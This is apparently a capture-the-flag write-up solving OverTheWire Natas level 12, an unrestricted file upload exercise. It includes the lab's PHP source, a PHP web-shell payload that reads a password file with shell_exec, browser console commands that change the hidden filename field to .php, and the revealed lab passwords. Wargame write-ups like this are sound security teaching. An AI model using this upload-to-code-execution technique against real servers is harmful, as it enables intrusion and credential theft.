# Natas Level 11 → Level 12 Unrestricted File Upload Vulnerability, Modify Hidden Form
# Remote Code Execution (RCE)

## Previous Flag
<b>yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB</b>

Choose a JPEG to upload (max 1KB):<br>
Choose File     No File Chosen<br>
Upload File

## Goal
Username: natas12<br>
URL: http://natas12.natas.labs.overthewire.org<br>

## What I learned
```
Limit the file types uploaded, can either reverse shell or run script
<pre></pre>     Preserve whitespace (spaces, tabs, newlines)
```

## Solution
```
Click View Source Code
http://natas12.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" /> 👀
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Write payload script and upload called script.php ⭐⭐⭐⭐⭐
<?php
$password = shell_exec("cat /etc/natas_webpass/natas13");
echo "<pre>$password</pre>"
?>

# Modify hidden input field in browser’s javascript console
# <input type="hidden" name="filename" value="h6kax7foa5.jpg">
# Step 1: Check if jQuery loaded if undefined use Vanilla JS
# Note: Don't matter name of file just has .php extension
typeof $ ⌨️
'function'
$('input[name="filename"]').val("test.php") ⌨️
init {0: input, length: 1, prevObject: init, context: document, selector: 'input[name="filename"]'}
# Optional: Vanilla JS version
document.querySelector('input[name="filename"]').value = "test.php"; ⌨️

# Upload the payload and browse to it
The file upload/pjw22nl394.php has been uploaded

http://natas12.natas.labs.overthewire.org/upload/pjw22nl394.php ⌨️
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 🔐
```

## Flag
<b>trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC</b>

## Continue
[Continue](./Natas1213.md)